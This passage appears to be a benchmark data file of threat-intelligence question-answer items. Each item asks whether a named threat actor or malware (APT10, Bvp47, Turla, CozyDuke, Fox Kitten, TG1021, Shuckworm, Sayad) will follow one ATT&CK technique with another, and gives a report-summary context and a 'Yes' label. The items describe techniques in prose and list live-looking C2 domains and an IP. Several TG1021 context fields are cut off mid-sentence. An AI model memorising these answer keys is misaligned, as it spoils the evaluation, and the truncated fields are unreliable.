1685,313,313-Execution-T1129-Shared Modules,"After using DLL Side-Loading with legitimate executables to load malicious DLLs during initial access, is it likely that APT10 will use the decrypted shellcode from svchost.bin to inject into svchost.exe before establishing persistence through services or the Run registry key?","Execution: The malicious DLL, jli.dll, mapped the data file svchost.bin to memory and decrypted it, revealing a shellcode that was injected into svchost.exe. This process resembled previous versions used by APT10 in PlugX/RedLeaves malware. The injection flow involved creating a process in a suspended state, allocating memory, writing the shellcode, and executing it remotely.","Initial Access: In April 2019, enSilo detected new activity by APT10, a Chinese cyber espionage group, in Southeast Asia. The group employed a tactic known as DLL Side-Loading, where a legitimate executable, jjs.exe, was abused to load a malicious DLL, jli.dll, instead of the legitimate one it depended on. This method was used to inject a shellcode into svchost.exe, which contained the actual malicious payload.
Persistence: APT10's first loader variant used a service as its persistence method, installing jjs.exe as the service and starting it. The service names observed included WxUpdateServiceInfo, HxUpdateServiceInfo, WinDefendSec, Web_Client, clr_optimization_v4.0.30319_31, and clr_optimization_v4.0.30319_37. The second variant used the Run registry key for the current user under the name 'Windows Updata' to ensure persistence.
Defense Evasion: APT10's loader implemented a decryption and injection mechanism to evade defenses. The PlugX payload used by APT10 replaced the DOS and NT headers' magic values with 'VX' to prevent security products from identifying executable headers during memory scans. Additionally, the malware authors wrapped memory allocation and release with dummy calls to GetForegroundWindow API function to generate noise and evade detection.
Command and Control: APT10 used Command and Control (C&C) servers located in South Korea. The first loader variant's domain (ffca[.]caibi379[.]com) resolved to IP addresses listed under 'DAOU TECHNOLOGY' in South Korea. The domain was registered in Hong Kong. The PlugX's domains resolved to IP addresses that were also associated with other domains used by APT10, indicating the same group operated both variants.
Others: APT10 delivered different payloads, including PlugX and Quasar RATs, with PlugX being developed in-house by the group. The Quasar RAT contained an addition of SharpSploit to extract passwords using mimikatz capabilities. The samples analyzed originated from the Philippines, and the activity was consistent with APT10's history of targeting Southeast Asia. The group used typosquatting domain names to pose as legitimate tech companies and employed unique malware families associated with them. The threat actor behind APT10 is still active, and the recent activity may be part of a testing environment or a short-lived attack.",Yes,Uncovering New Activity By APT10
1697,314,314-Command and Control-T1205-Traffic Signaling,"Is it likely that after Bvp47 conducts runtime environment tests and verifies the operating environment to prevent dynamic analysis during discovery, it will establish a covert communication channel using BPF filters and receive commands via SYN packets under the command and control tactic?",Command and Control: Bvp47 establishes a covert communication channel using BPF to filter packets and employs RSA and RC-X algorithms for secure communication. It receives commands via SYN packets that meet specific BPF rules and then decrypts and executes them.,"Initial Access: In 2015, an advanced threat detection system alerted to suspicious communication activities between important servers. Two servers, V1 and V2, were compromised with backdoors, and a third server, host A, was identified as the source of external attacks. The V1 server received a SYN packet with a payload from host A, then initiated a connection to host A and exchanged a large amount of encrypted data. V1 also connected to V2's SMB service, performed sensitive operations, and downloaded suspicious files from a Python-implemented HTTP server on V1. These files included a Base64-encoded PowerShell script and encrypted data.
Execution: The Bvp47 backdoor, once activated, maintains a process in Linux user mode and kernel mode. It initializes the Bvp engine, performs environmental tests, decrypts payload blocks, tampers with kernel devmem restrictions, loads non-standard LKM module files, and hooks system functions to hide its presence.
Persistence: Bvp47 uses a loader to decrypt and load its payload, which is compressed and assembled at the end of the file. The payload includes various slices that provide backdoor functionality. The backdoor is designed to remain persistent on the system by hiding its processes, files, and network connections.
Privilege Escalation: Bvp47 hooks the devmem_is_allowed function, allowing user mode processes to read and write kernel space. It also hooks the avc_has_perm function to bypass SeLinux restrictions.
Defense Evasion: Bvp47 employs various techniques to evade detection, including hooking nearly 70 system functions, modifying the first four bytes of kernel module elf files, and using BPF as a covert channel to filter packets. It also uses XOR encryption for strings and blocks, obfuscates function names, and employs the Bvp engine for dynamic calculations of Linux kernel data and function addresses.
Discovery: Bvp47 conducts runtime environment tests to prevent security researchers from performing dynamic analysis. It verifies the operating environment by checking the checksum against the number of blocks and files.
Lateral Movement: The V1 server connected to V2's SMB service to perform sensitive operations, indicating lateral movement within the compromised network.
Others: The Bvp47 backdoor is attributed to the Equation Group, linked to the US NSA. It was discovered during an investigation of a key domestic department in 2013 and later connected to 'The Shadow Brokers Leaks' incident. The backdoor has been active for over 10 years, targeting 287 victims in 45 countries. It uses advanced covert channel behavior based on TCP SYN packets, code obfuscation, system hiding, and self-destruction design. The Bvp47 incidents are part of 'Operation Telescreen,' and the backdoor is considered a top-tier APT tool with capabilities spanning the *nix platform and possibly involving Cisco, Solaris, AIX, SUN, and Windows platforms.",Yes,The_Bvp47_a_top-tier_backdoor_of_us_nsa_equation_group.en
1710,316,316-Collection-T1213-Data from Information Repositories,"After Turla uses its encrypted file system for defense evasion by storing stolen data and tools, is it likely that it will include document stealers in its specialized tools for collecting data from information repositories?","Collection: Turla's operators can download specialized tools onto an infected system, adding any functionality they want by including it in the encrypted file system. These tools include password stealers, programs for gathering system information, and document stealers, indicating a Collection tactic.","Initial Access: The CTI report indicates that the Turla spyware has been infecting government computers across Europe and the United States, suggesting an Initial Access tactic. The malware, also known as Uroburos, is believed to be linked to the Russian government and has been used to launch a massive breach on the U.S. military in 2008. It is part of a global cyber spying operation called Red October targeting diplomatic, military, and nuclear research networks.
Persistence: The Turla malware establishes a hidden foothold in infected networks, allowing the attackers to maintain persistent access. This foothold enables them to search other computers, store stolen information, and transmit data back to their servers.
Defense Evasion: Turla is described as sophisticated malware that uses encryption to evade defenses. It is adept at hiding its tracks and maintaining control of infected networks. The malware includes a 'root kit' that conceals the spying operation and creates a hidden, encrypted file system to store stolen data and tools used by the attackers.
Command and Control: Turla uses dozens of different command and control servers located in countries around the world to control infected systems. Symantec researchers have helped identify and shut down some of these systems. The code is regularly updated, including changes to avoid detection as anti-virus companies detect new strains.
Others: The CTI report authored by Peter Apps and Jim Finkle from Reuters, dated 2:45pm EST, discusses the Turla spyware targeting Europe and the United States. Security firms have been monitoring Turla for several years, with Symantec Corp estimating up to 1,000 networks infected by Turla and a related virus, Agent.BTZ. BAE Systems Applied Intelligence has collected over 100 unique samples of Turla since 2010. The report also mentions that the Federal Security Bureau, Pentagon, and U.S. Department of Homeland Security officials declined to comment on the matter.",Yes,Reuters_Turla
1718,318,318-Persistence-T1053-Scheduled Task/Job,"After execution of its primary DLL component via rundll32.exe to perform initial tasks and communicate with the C&C server, is it likely that CozyDuke will utilize techniques such as registry manipulation or COM-object hijacking for persistence before registering itself as a Windows service or scheduled task?",Persistence: CozyDuke establishes persistence by setting itself to be executed at system startup through registry values under various registry keys or by registering itself as a Windows service or scheduled task. It may also utilize COM-object hijacking to ensure it stays active on the victim host.,"Initial Access: The CozyDuke toolset includes an infection vector that involves spreading via email, typically containing a link to a compromised website hosting a ZIP file, or in some cases, hosted on Dropbox. The ZIP file contains an executable that, upon execution, writes to disk and executes CozyDuke while presenting the user with a decoy, such as an uninteresting PDF or a Flash video of monkeys.
Execution: The main component of CozyDuke is a DLL file responsible for orchestrating all of CozyDuke's activity on a victim machine. It is executed by the CozyDuke dropper using a copy of rundll32.exe. The entrypoint function varies but is always specified in the dropper configuration. The main component's functionalities include establishing persistence, gathering basic system information, communicating with the C&C server, and executing additional tasks, modules, or executables as commanded by the C&C server.
Defense Evasion: The main CozyDuke dropper checks for anti-virus products installed on the victim's machine and compares them to a predetermined list. If a match is found, the dropper exits immediately. Newer versions of the dropper also check for execution within a virtual machine or known malware analysis sandbox environment and will exit if these checks fail. The dropper decrypts encrypted data stored as PE resources in the executable, which are used to install CozyDuke components on the victim system.
Command and Control: CozyDuke communicates with its C&C server using HTTP or HTTPS, with the details specified in its configuration data. It can also use Twitter as a backup C&C channel, with the account details included in the configuration data. Known CozyDuke C&C servers are believed to be compromised servers.
Others: CozyDuke has been under active development since at least 2011 and is used for targeted attacks against high-profile organizations, including governmental entities. It shares infrastructure with other known threats like MiniDuke and OnionDuke. CozyDuke's evolution shows significant refactoring and additional functionality over time. The toolset includes modules and executables for tasks such as command execution, password stealing, and information collection. CozyDuke uses various user agent strings and mutexes, and a variety of filenames are associated with its activities.",Yes,CozyDuke
1719,318,318-Persistence-T1574-Hijack Execution Flow,"After CozyDuke is executed by its dropper using rundll32.exe and performs tasks such as establishing persistence, is it likely that CozyDuke will utilize COM-object hijacking to ensure continued execution before communicating with its C&C server via HTTP, HTTPS, or Twitter?",Persistence: CozyDuke establishes persistence by setting itself to be executed at system startup through registry values under various registry keys or by registering itself as a Windows service or scheduled task. It may also utilize COM-object hijacking to ensure it stays active on the victim host.,"Initial Access: The CozyDuke toolset includes an infection vector that involves spreading via email, typically containing a link to a compromised website hosting a ZIP file, or in some cases, hosted on Dropbox. The ZIP file contains an executable that, upon execution, writes to disk and executes CozyDuke while presenting the user with a decoy, such as an uninteresting PDF or a Flash video of monkeys.
Execution: The main component of CozyDuke is a DLL file responsible for orchestrating all of CozyDuke's activity on a victim machine. It is executed by the CozyDuke dropper using a copy of rundll32.exe. The entrypoint function varies but is always specified in the dropper configuration. The main component's functionalities include establishing persistence, gathering basic system information, communicating with the C&C server, and executing additional tasks, modules, or executables as commanded by the C&C server.
Defense Evasion: The main CozyDuke dropper checks for anti-virus products installed on the victim's machine and compares them to a predetermined list. If a match is found, the dropper exits immediately. Newer versions of the dropper also check for execution within a virtual machine or known malware analysis sandbox environment and will exit if these checks fail. The dropper decrypts encrypted data stored as PE resources in the executable, which are used to install CozyDuke components on the victim system.
Command and Control: CozyDuke communicates with its C&C server using HTTP or HTTPS, with the details specified in its configuration data. It can also use Twitter as a backup C&C channel, with the account details included in the configuration data. Known CozyDuke C&C servers are believed to be compromised servers.
Others: CozyDuke has been under active development since at least 2011 and is used for targeted attacks against high-profile organizations, including governmental entities. It shares infrastructure with other known threats like MiniDuke and OnionDuke. CozyDuke's evolution shows significant refactoring and additional functionality over time. The toolset includes modules and executables for tasks such as command execution, password stealing, and information collection. CozyDuke uses various user agent strings and mutexes, and a variety of filenames are associated with its activities.",Yes,CozyDuke
1722,319,319-Command and Control-T1572-Protocol Tunneling,"After the Fox Kitten Campaign engaged in lateral movement using tools like 'STSRCheck' and 'PORT.EXE' to map and access systems, is it likely that the campaign established command and control using tools like POWSSHNET, Ngrok, Serveo, and FRP for communication channels?","Command and Control: The campaign established command and control using a self-developed backdoor named 'POWSSHNET' for RDP over SSH tunneling, and utilized socket-based backdoors for creating communication channels. Public tools like Ngrok, Serveo, and FRP were used for reverse proxy/SSH forwarding.","Reconnaissance: The Fox Kitten Campaign, attributed to Iranian APT groups, involved reconnaissance activities targeting companies and organizations globally, including sectors like IT, Telecommunication, Oil and Gas, Aviation, Government, and Security. The campaign infrastructure served as a reconnaissance platform and could potentially deploy destructive malware such as ZeroCleare and Dustman, linked to APT34. Connections were identified with medium probability to APT33-Elfin and APT39-Chafer groups. The campaign's infrastructure, used since 2017, facilitated the development and maintenance of access routes, theft of valuable information, and long-lasting foothold in targeted organizations, enabling further breaches through supply-chain attacks.
Initial Access: The Fox Kitten Campaign primarily gained initial access by exploiting 1-day vulnerabilities in various VPN services, including Pulse Secure VPN, Fortinet VPN, and Global Protect by Palo Alto Networks. The attackers maintained access to networks by using communication tools like RDP over SSH tunneling, camouflaging and encrypting communications with the targets.
Execution: Upon initial compromise, the Fox Kitten Campaign utilized tools like Putty and Plink for execution purposes. Additionally, the attackers used a VBScript to download and unify hex-encoded file chunks from TXT files into executable files, bypassing antivirus detection.
Persistence: To ensure persistence within compromised networks, the Fox Kitten Campaign employed techniques such as creating local admin users and manipulating accessibility tools like 'Sticky Keys' to maintain high privileges.
Privilege Escalation: The campaign used tools like JuicyPotato for local privilege escalation and leveraged legitimate Microsoft tools like ProcDump, combined with Mimikatz, to steal credentials from the Lsass.exe process.
Defense Evasion: The Fox Kitten Campaign demonstrated defense evasion by using tools that were rarely detected by antivirus engines. The attackers also employed evasion techniques to identify and avoid virtual machine environments.
Credential Access: Credential access was achieved through the use of tools like Procdump and Mimikatz to dump and extract credentials from the Lsass.exe process. Additionally, the campaign utilized 'Invoke the Hash' for pass-the-hash attacks.
Discovery: For discovery within the target networks, the campaign developed a tool named 'STSRCheck' for mapping databases, servers, and open ports, and used 'PORT.EXE' to scan for predefined ports and IP addresses.
Lateral Movement: The Fox Kitten Campaign engaged in lateral movement using tools like 'STSRCheck' and 'PORT.EXE' to map and access various systems within the network. They also used 'Invoke the Hash' to perform pass-the-hash attacks.
Exfiltration: For exfiltration, the attackers manually selected valuable intelligence, compressed it into archives using WinRAR or 7-zip, and then exfiltrated the data.
Others: The Fox Kitten Campaign is linked to Iranian APT groups, with connections to APT34, APT33, and APT39. The campaign's focus on IT companies suggests a strategy of targeting service providers to access networks of additional companies. The attackers' ability to exploit 1-day vulnerabilities shortly after disclosure indicates a high level of technical capability. The campaign's infrastructure includes a variety of offensive tools, some self-developed and others open-source or legitimate tools repurposed for malicious use. The attackers' methods include exploiting VPN vulnerabilities, maintaining access through RDP, and exfiltrating data. The campaign's duration and scope suggest it is one of Iran's most comprehensive espionage efforts to date.",Yes,ClearSky-Fox-Kitten-Campaign-v1
1735,319,319-Lateral Movement-T1550-Use Alternate Authentication Material,"After utilizing 'PORT.EXE' and 'STSRCheck' to scan for predefined ports, IP addresses, and map the internal network for discovery, is it likely that the Fox Kitten Campaign will use 'Invoke the Hash' to perform pass-the-hash attacks for lateral movement before establishing RDP connections over SSH tunneling using 'POWSSHNET' for command and control?",Lateral Movement: The Fox Kitten Campaign engaged in lateral movement using tools like 'STSRCheck' and 'PORT.EXE' to map and access various systems within the network. They also used 'Invoke the Hash' to perform pass-the-hash attacks.,"Reconnaissance: The Fox Kitten Campaign, attributed to Iranian APT groups, involved reconnaissance activities targeting companies and organizations globally, including sectors like IT, Telecommunication, Oil and Gas, Aviation, Government, and Security. The campaign infrastructure served as a reconnaissance platform and could potentially deploy destructive malware such as ZeroCleare and Dustman, linked to APT34. Connections were identified with medium probability to APT33-Elfin and APT39-Chafer groups. The campaign's infrastructure, used since 2017, facilitated the development and maintenance of access routes, theft of valuable information, and long-lasting foothold in targeted organizations, enabling further breaches through supply-chain attacks.
Initial Access: The Fox Kitten Campaign primarily gained initial access by exploiting 1-day vulnerabilities in various VPN services, including Pulse Secure VPN, Fortinet VPN, and Global Protect by Palo Alto Networks. The attackers maintained access to networks by using communication tools like RDP over SSH tunneling, camouflaging and encrypting communications with the targets.
Execution: Upon initial compromise, the Fox Kitten Campaign utilized tools like Putty and Plink for execution purposes. Additionally, the attackers used a VBScript to download and unify hex-encoded file chunks from TXT files into executable files, bypassing antivirus detection.
Persistence: To ensure persistence within compromised networks, the Fox Kitten Campaign employed techniques such as creating local admin users and manipulating accessibility tools like 'Sticky Keys' to maintain high privileges.
Privilege Escalation: The campaign used tools like JuicyPotato for local privilege escalation and leveraged legitimate Microsoft tools like ProcDump, combined with Mimikatz, to steal credentials from the Lsass.exe process.
Defense Evasion: The Fox Kitten Campaign demonstrated defense evasion by using tools that were rarely detected by antivirus engines. The attackers also employed evasion techniques to identify and avoid virtual machine environments.
Credential Access: Credential access was achieved through the use of tools like Procdump and Mimikatz to dump and extract credentials from the Lsass.exe process. Additionally, the campaign utilized 'Invoke the Hash' for pass-the-hash attacks.
Discovery: For discovery within the target networks, the campaign developed a tool named 'STSRCheck' for mapping databases, servers, and open ports, and used 'PORT.EXE' to scan for predefined ports and IP addresses.
Command and Control: The campaign established command and control using a self-developed backdoor named 'POWSSHNET' for RDP over SSH tunneling, and utilized socket-based backdoors for creating communication channels. Public tools like Ngrok, Serveo, and FRP were used for reverse proxy/SSH forwarding.
Exfiltration: For exfiltration, the attackers manually selected valuable intelligence, compressed it into archives using WinRAR or 7-zip, and then exfiltrated the data.
Others: The Fox Kitten Campaign is linked to Iranian APT groups, with connections to APT34, APT33, and APT39. The campaign's focus on IT companies suggests a strategy of targeting service providers to access networks of additional companies. The attackers' ability to exploit 1-day vulnerabilities shortly after disclosure indicates a high level of technical capability. The campaign's infrastructure includes a variety of offensive tools, some self-developed and others open-source or legitimate tools repurposed for malicious use. The attackers' methods include exploiting VPN vulnerabilities, maintaining access through RDP, and exfiltrating data. The campaign's duration and scope suggest it is one of Iran's most comprehensive espionage efforts to date.",Yes,ClearSky-Fox-Kitten-Campaign-v1
1744,32,32-Defense Evasion-T1070-Indicator Removal,"After TG1021 employed a custom version of the Potato family tools for privilege escalation, is it likely that they demonstrated significant efforts to avoid detection by removing all disk-resident tools as part of their defense evasion strategy?","Defense Evasion: TG1021 demonstrated significant efforts to avoid detection by actively interfering with logging mechanisms and successfully evading commercial EDRs. The malware used by TG1021 shows a significant effort to avoid detection, both by actively interfering with logging mechanisms, successfully evading commercial EDRs, and by silently awaiting incoming connections, rather than connecting back to a C2 channel and continuously generating traffic. Furthermore, the threat actor actively removed all disk-resident tools after using them, effectively giving up on persistency in exchange for stealth.","Reconnaissance: The Sygnia Incident Response team identified that TG1021, also known as \
Initial Access: TG1021 gained initial access to target networks by exploiting internet-facing Windows IIS servers using deserialization attacks. The threat actor leveraged a variety of exploits, including a 0-day vulnerability associated with the \
Execution: TG1021 executed a sophisticated memory-resident malware, referred to as \
Persistence: To maintain persistence, TG1021 utilized web shells and a custom malware framework that operates almost entirely in-memory. The core component of this framework, the NodeIISWeb malware, intercepts and handles HTTP requests received by the server. Additionally, the threat actor actively removed all disk-resident tools after using them, effectively giving up on persistency in exchange for stealth.
Privilege Escalation: TG1021 employed various techniques for privilege escalation, including the use of a custom version of the Potato family tools, known as PotatoEx.dll, which is a common local privilege escalation tool. The threat actor also used dynamic DLL loading and execution, as well as code injection and token manipulation functionalities provided by the second stage malware, ExtDLL.dll.
Credential Access: TG1021 modified login webpages to record credentials and save them to a file in clear text format. The modification is a short-embedded code-block at the beginning of the webpage file with a simple try-catch phrase code.
Discovery: TG1021 used publicly available offensive security tools (OST) to perform reconnaissance, such as SharpHound to scan and map targets by loading it directly to infected machines' memory without writing the binary on the disk. Quickly after the execution, the threat actor retrieved the output files and deleted them. In addition, PowerSploit was loaded and executed using the same technique.
Lateral Movement: After establishing a foothold on an external IIS server, TG1021 accessed shared folders on internal web servers over SMB using compromised domain credentials. On several occasions, the threat actor dropped the NodeIISWeb web shell loader via SMB to compromise additional servers. Additionally, the threat actor utilized the exploits mentioned above to move laterally between IIS servers.
Command and Control: TG1021 established command and control by deploying an inline hook on a validation function within the IIS request handling process. The malware, NodeIISWeb, provided backdoor functionality, allowing the threat actor to perform various actions on the affected host, including file and directory manipulation, system information gathering, dynamic DLL loading and execution, and code injection.",Yes,TG1021 - Praying Mantis Threat Actor
1748,32,32-Lateral Movement-T1210-Exploitation of Remote Services,"After TG1021 used publicly available offensive security tools such as SharpHound and PowerSploit loaded directly into memory for reconnaissance during the Discovery phase, is it likely that the threat actor would utilize exploits to compromise additional IIS servers for lateral movement before establishing command and control with an inline hook on the IIS request validation function?","Lateral Movement: After establishing a foothold on an external IIS server, TG1021 accessed shared folders on internal web servers over SMB using compromised domain credentials. On several occasions, the threat actor dropped the NodeIISWeb web shell loader via SMB to compromise additional servers. Additionally, the threat actor utilized the exploits mentioned above to move laterally between IIS servers.","Reconnaissance: The Sygnia Incident Response team identified that TG1021, also known as \
Initial Access: TG1021 gained initial access to target networks by exploiting internet-facing Windows IIS servers using deserialization attacks. The threat actor leveraged a variety of exploits, including a 0-day vulnerability associated with the \
Execution: TG1021 executed a sophisticated memory-resident malware, referred to as \
Persistence: To maintain persistence, TG1021 utilized web shells and a custom malware framework that operates almost entirely in-memory. The core component of this framework, the NodeIISWeb malware, intercepts and handles HTTP requests received by the server. Additionally, the threat actor actively removed all disk-resident tools after using them, effectively giving up on persistency in exchange for stealth.
Privilege Escalation: TG1021 employed various techniques for privilege escalation, including the use of a custom version of the Potato family tools, known as PotatoEx.dll, which is a common local privilege escalation tool. The threat actor also used dynamic DLL loading and execution, as well as code injection and token manipulation functionalities provided by the second stage malware, ExtDLL.dll.
Defense Evasion: TG1021 demonstrated significant efforts to avoid detection by actively interfering with logging mechanisms and successfully evading commercial EDRs. The malware used by TG1021 shows a significant effort to avoid detection, both by actively interfering with logging mechanisms, successfully evading commercial EDRs, and by silently awaiting incoming connections, rather than connecting back to a C2 channel and continuously generating traffic. Furthermore, the threat actor actively removed all disk-resident tools after using them, effectively giving up on persistency in exchange for stealth.
Credential Access: TG1021 modified login webpages to record credentials and save them to a file in clear text format. The modification is a short-embedded code-block at the beginning of the webpage file with a simple try-catch phrase code.
Discovery: TG1021 used publicly available offensive security tools (OST) to perform reconnaissance, such as SharpHound to scan and map targets by loading it directly to infected machines' memory without writing the binary on the disk. Quickly after the execution, the threat actor retrieved the output files and deleted them. In addition, PowerSploit was loaded and executed using the same technique.
Command and Control: TG1021 established command and control by deploying an inline hook on a validation function within the IIS request handling process. The malware, NodeIISWeb, provided backdoor functionality, allowing the threat actor to perform various actions on the affected host, including file and directory manipulation, system information gathering, dynamic DLL loading and execution, and code injection.",Yes,TG1021 - Praying Mantis Threat Actor
1752,320,320-Persistence-T1547-Boot or Logon Autostart Execution,"After executing VBS scripts and HTA files to maintain their presence and leverage backdoors, is Shuckworm likely to create scheduled tasks to achieve persistence before bypassing browser security settings and application controls using mshta.exe?",Persistence: Shuckworm established persistence by creating scheduled tasks that executed malicious VBS files every few minutes. These tasks ensured that their backdoor would remain active even after system reboots.,"Initial Access: The attack chain initiated by Shuckworm against a Ukrainian organization began on July 14, 2021, with the opening of a malicious document, likely delivered via phishing email. The document contained a custom backdoor known as Pterodo, which was executed using a suspicious command.
Execution: Following the initial compromise, Shuckworm executed various VBS scripts and HTA files to maintain their presence and execute their backdoor. They also created scheduled tasks to ensure persistence and executed commands via scripts. On July 16, additional variants of Pterodo were executed, and on July 28, a VNC client was installed as the ultimate payload for the attack.
Defense Evasion: Shuckworm utilized mshta.exe to bypass application control solutions and browser security settings. They also used scheduled tasks and VBS scripts to evade detection and maintain their foothold.
Collection: Between July 29 and August 18, Shuckworm deployed multiple variants of their custom VBS backdoor and executed VBS scripts. It is unclear if the documents accessed during this period were part of the attackers' efforts to collect and exfiltrate sensitive information.
Command and Control: Shuckworm established command and control by communicating with their servers using HTTP requests and downloading additional payloads. They used various C&C servers, including deep-pitched.enarto.ru, arianat.ru, and mucoris.ru, to control the compromised systems and download tools.
Others: Symantec's Threat Hunter Team, part of Broadcom Software, has been tracking Shuckworm's cyber-espionage activities against Ukraine. Shuckworm, also known as Gamaredon or Armageddon, has been active since at least 2013 and has recently increased the sophistication of their attacks. The Security Service of Ukraine (SSU) reported that Shuckworm has been using living-off-the-land tools to steal credentials and move laterally on victim networks. Symantec's investigation revealed seven files used by Shuckworm in their attacks, all of which are 7-zip SFX self-extracting binaries. These files included various VBS files, a VNC client, and a Process Explorer binary. The IOCs from the investigation showed patterns such as C&C IPs belonging to a short list of hosting providers and suspected malicious files found in specific directories with names starting with the letter 'd'. The SSU report from November 2021 attributed over 5,000 attacks to Shuckworm since 2014, targeting more than 1,500 Ukrainian government systems.",Yes,Shuckworm_APT
1758,320,320-Command and Control-T1071-Application Layer Protocol,"After executing VBS scripts and HTA files to maintain their presence and deploying additional variants of Pterodo, is it likely that Shuckworm will establish command and control by using HTTP requests and interacting with C&C servers such as deep-pitched.enarto.ru before downloading additional payloads?","Command and Control: Shuckworm established command and control by communicating with their servers using HTTP requests and downloading additional payloads. They used various C&C servers, including deep-pitched.enarto.ru, arianat.ru, and mucoris.ru, to control the compromised systems and download tools.","Initial Access: The attack chain initiated by Shuckworm against a Ukrainian organization began on July 14, 2021, with the opening of a malicious document, likely delivered via phishing email. The document contained a custom backdoor known as Pterodo, which was executed using a suspicious command.
Execution: Following the initial compromise, Shuckworm executed various VBS scripts and HTA files to maintain their presence and execute their backdoor. They also created scheduled tasks to ensure persistence and executed commands via scripts. On July 16, additional variants of Pterodo were executed, and on July 28, a VNC client was installed as the ultimate payload for the attack.
Persistence: Shuckworm established persistence by creating scheduled tasks that executed malicious VBS files every few minutes. These tasks ensured that their backdoor would remain active even after system reboots.
Defense Evasion: Shuckworm utilized mshta.exe to bypass application control solutions and browser security settings. They also used scheduled tasks and VBS scripts to evade detection and maintain their foothold.
Collection: Between July 29 and August 18, Shuckworm deployed multiple variants of their custom VBS backdoor and executed VBS scripts. It is unclear if the documents accessed during this period were part of the attackers' efforts to collect and exfiltrate sensitive information.
Others: Symantec's Threat Hunter Team, part of Broadcom Software, has been tracking Shuckworm's cyber-espionage activities against Ukraine. Shuckworm, also known as Gamaredon or Armageddon, has been active since at least 2013 and has recently increased the sophistication of their attacks. The Security Service of Ukraine (SSU) reported that Shuckworm has been using living-off-the-land tools to steal credentials and move laterally on victim networks. Symantec's investigation revealed seven files used by Shuckworm in their attacks, all of which are 7-zip SFX self-extracting binaries. These files included various VBS files, a VNC client, and a Process Explorer binary. The IOCs from the investigation showed patterns such as C&C IPs belonging to a short list of hosting providers and suspected malicious files found in specific directories with names starting with the letter 'd'. The SSU report from November 2021 attributed over 5,000 attacks to Shuckworm since 2014, targeting more than 1,500 Ukrainian government systems.",Yes,Shuckworm_APT
1759,320,320-Command and Control-T1105-Ingress Tool Transfer,"After utilizing HTTP requests to communicate with their C&C servers, is Shuckworm likely to download additional payloads before using these payloads to maintain control over compromised systems during their cyber espionage activities?","Command and Control: Shuckworm established command and control by communicating with their servers using HTTP requests and downloading additional payloads. They used various C&C servers, including deep-pitched.enarto.ru, arianat.ru, and mucoris.ru, to control the compromised systems and download tools.","Initial Access: The attack chain initiated by Shuckworm against a Ukrainian organization began on July 14, 2021, with the opening of a malicious document, likely delivered via phishing email. The document contained a custom backdoor known as Pterodo, which was executed using a suspicious command.
Execution: Following the initial compromise, Shuckworm executed various VBS scripts and HTA files to maintain their presence and execute their backdoor. They also created scheduled tasks to ensure persistence and executed commands via scripts. On July 16, additional variants of Pterodo were executed, and on July 28, a VNC client was installed as the ultimate payload for the attack.
Persistence: Shuckworm established persistence by creating scheduled tasks that executed malicious VBS files every few minutes. These tasks ensured that their backdoor would remain active even after system reboots.
Defense Evasion: Shuckworm utilized mshta.exe to bypass application control solutions and browser security settings. They also used scheduled tasks and VBS scripts to evade detection and maintain their foothold.
Collection: Between July 29 and August 18, Shuckworm deployed multiple variants of their custom VBS backdoor and executed VBS scripts. It is unclear if the documents accessed during this period were part of the attackers' efforts to collect and exfiltrate sensitive information.
Others: Symantec's Threat Hunter Team, part of Broadcom Software, has been tracking Shuckworm's cyber-espionage activities against Ukraine. Shuckworm, also known as Gamaredon or Armageddon, has been active since at least 2013 and has recently increased the sophistication of their attacks. The Security Service of Ukraine (SSU) reported that Shuckworm has been using living-off-the-land tools to steal credentials and move laterally on victim networks. Symantec's investigation revealed seven files used by Shuckworm in their attacks, all of which are 7-zip SFX self-extracting binaries. These files included various VBS files, a VNC client, and a Process Explorer binary. The IOCs from the investigation showed patterns such as C&C IPs belonging to a short list of hosting providers and suspected malicious files found in specific directories with names starting with the letter 'd'. The SSU report from November 2021 attributed over 5,000 attacks to Shuckworm since 2014, targeting more than 1,500 Ukrainian government systems.",Yes,Shuckworm_APT
1767,321,321-Discovery-T1046-Network Service Discovery,"After Sayad collects open ports on the compromised host for network service discovery, is it likely to proceed to collect keystrokes, clipboard contents, browser bookmarks and cookies, chat history, and VPN-related account information as part of its data collection phase before uploading the encrypted data to a malicious web server for exfiltration?","Discovery: Sayad collects a wide range of information from the compromised host, including system information, running processes, open ports, and registered proxies. It also gathers data from browsers, messengers, and other applications to discover the environment it has compromised.","Reconnaissance: The Sayad malware, also known as Flying Kitten, is distributed through phishing emails, indicating a form of reconnaissance where the attackers gather email addresses and possibly other information to target specific individuals or organizations.
Resource Development: The Sayad malware is a self-contained executable that embeds all required malicious components, meaning it does not need to download additional content from a C2 server, which could be suspicious. This suggests that the attackers have developed and staged their capabilities in advance.
Initial Access: Sayad malware gains initial access through phishing emails, which trick users into downloading and executing the malicious executable.
Execution: The Sayad malware executes by first running a self-extracting executable (WEXTRACT.exe) that drops and launches the Binder executable malware. The Binder then checks the .NET version installed on the machine and drops the information stealer DLL component, Sayad (aka Client)  - DiagnosticsService.dll.
Persistence: The Sayad malware ensures persistence by modifying the registry to run at startup using rundll32.exe, which loads the Client (DiagnosticsService.dll).
Defense Evasion: Sayad uses an oversimplified form of obfuscation for strings utilizing Base64 encoding, which can be easily de-obfuscated. It also uses non-traditional methods for native to .NET interop, like exporting a managed API through the native Export Address Table, to evade detection.
Credential Access: Sayad is designed to steal sensitive information, including credentials for FTP clients (FileZilla and WinSCP), VPN client user configuration files, and RDP and Putty accounts.
Collection: Sayad collects various types of data, including keystrokes, clipboard contents, browser bookmarks and cookies, chat history, and VPN-related account information. It also captures screenshots and collects data from removable media.
Command and Control: The Sayad malware communicates with a C2 server located at the IP address 107.6.182.179 to upload collected data. The data is encrypted using an RSA public key before being uploaded.
Exfiltration: The Sayad malware uploads the collected and encrypted data to a malicious web server using the URL hxxp://0o0o0o0o0.com/soft.php.
Others: The Sayad malware is linked to the Iranian hacking group Ajax Security Team. The detection rate for the Sayad malware binary at VirusTotal is zero, indicating that it may not be widely recognized by antivirus solutions. The malware uses a .NET OOP/OOD background and is unique in its implementation. The malicious server is located in the Netherlands, and the domain was registered with email addresses associated with microsofts.com, which raises questions about the legitimacy of the registration.",Yes,Sayad_Flying_Kitten_analysis
1768,321,321-Discovery-T1016-System Network Configuration Discovery,"After modifying the registry to run at startup using rundll32.exe for persistence, is it likely that Sayad will collect system information, running processes, open ports, and registered proxies from the compromised host before uploading the encrypted collected data to the malicious web server?","Discovery: Sayad collects a wide range of information from the compromised host, including system information, running processes, open ports, and registered proxies. It also gathers data from browsers, messengers, and other applications to discover the environment it has compromised.","Reconnaissance: The Sayad malware, also known as Flying Kitten, is distributed through phishing emails, indicating a form of reconnaissance where the attackers gather email addresses and possibly other information to target specific individuals or organizations.
